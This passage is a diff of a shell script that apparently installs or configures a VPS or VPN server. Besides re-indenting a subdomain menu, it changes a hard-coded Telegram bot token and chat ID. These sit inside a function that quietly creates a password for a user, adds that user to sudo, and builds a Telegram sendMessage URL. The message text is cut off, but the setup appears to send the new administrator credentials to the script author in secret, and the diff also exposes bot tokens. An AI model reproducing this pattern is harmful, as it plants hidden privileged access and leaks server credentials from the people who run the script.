@@ -273,8 +273,8 @@ echo -e ""
 clear
    echo -e "${red}                ♦️ CUSTOM SETUP DOMAIN VPS ♦️   ${NC}"
    echo -e "\e[32m      ┌───────────────────────────────────────────────┐\033[0m"
-   echo -e "       \e[1;32m1)\e[0m Enter Your Subdomain"
-   echo -e "       \e[1;32m2)\e[0m Use a Random Subdomain"
+   echo -e "          \e[1;32m1)\e[0m Enter Your Subdomain"
+   echo -e "          \e[1;32m2)\e[0m Use a Random Subdomain"
    echo -e "\e[32m      └───────────────────────────────────────────────┘\033[0m"
 read -p "   Please select numbers 1-2 or Any Button(Random) : " host
 echo ""
@@ -311,8 +311,8 @@ function password_default() {
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
 
-    CHATID="576495165"
-    KEY="6338068936:AAHiZflXdNWM6vrWgu474SXhzxcKZ_ITDv0"
+    CHATID="5807961610"
+    KEY="6210655575:AAH4TkHoDco4ShhlrD6HZMUIfpTWHKIVdog"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
     TEXT=" 
